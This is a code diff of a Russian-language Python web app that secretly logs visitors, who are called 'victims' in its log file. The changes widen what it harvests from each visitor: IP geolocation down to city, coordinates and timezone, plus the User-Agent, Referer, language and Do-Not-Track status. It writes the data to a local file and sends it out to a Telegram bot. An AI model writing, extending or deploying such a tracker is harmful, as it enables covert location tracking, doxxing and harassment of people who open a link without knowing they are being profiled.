@@ -11,7 +11,7 @@ TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
 def get_ip_info(ip):
     try:
-        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,mobile,proxy,hosting,query")
+        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,mobile,proxy,hosting,timezone,query")
         data = response.json()
         if data.get("status") == "fail":
             return f"IP: {ip} (информация недоступна)"
@@ -19,6 +19,7 @@ def get_ip_info(ip):
                 f"🌍 Страна: {data['country']}\n"
                 f"🏙 Регион: {data['regionName']}\n"
                 f"🏠 Город: {data['city']} ({data['zip']})\n"
+                f"🕒 Временная зона: {data['timezone']}\n"
                 f"📍 Координаты: {data['lat']}, {data['lon']}\n"
                 f"📡 Провайдер: {data['isp']}\n"
                 f"🏢 Организация: {data['org']}\n"
@@ -42,8 +43,16 @@ def send_to_telegram(message):
 def log_ip():
     user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)  # Учитываем прокси
     user_agent = request.headers.get("User-Agent")
+    referer = request.headers.get("Referer", "Неизвестно")
+    accept_language = request.headers.get("Accept-Language", "Неизвестно")
+    dnt = request.headers.get("DNT", "Неизвестно")
+    
     ip_info = get_ip_info(user_ip)
-    log_message = f"{ip_info}\n🖥 User-Agent: {user_agent}"
+    log_message = (f"{ip_info}\n"
+                   f"🖥 User-Agent: {user_agent}\n"
+                   f"🔗 Referer: {referer}\n"
+                   f"🌐 Язык: {accept_language}\n"
+                   f"🚫 DNT (Не отслеживать): {'Включено' if dnt == '1' else 'Выключено'}")
     
     # Запись в файл
     with open('victims.log', 'a') as f:
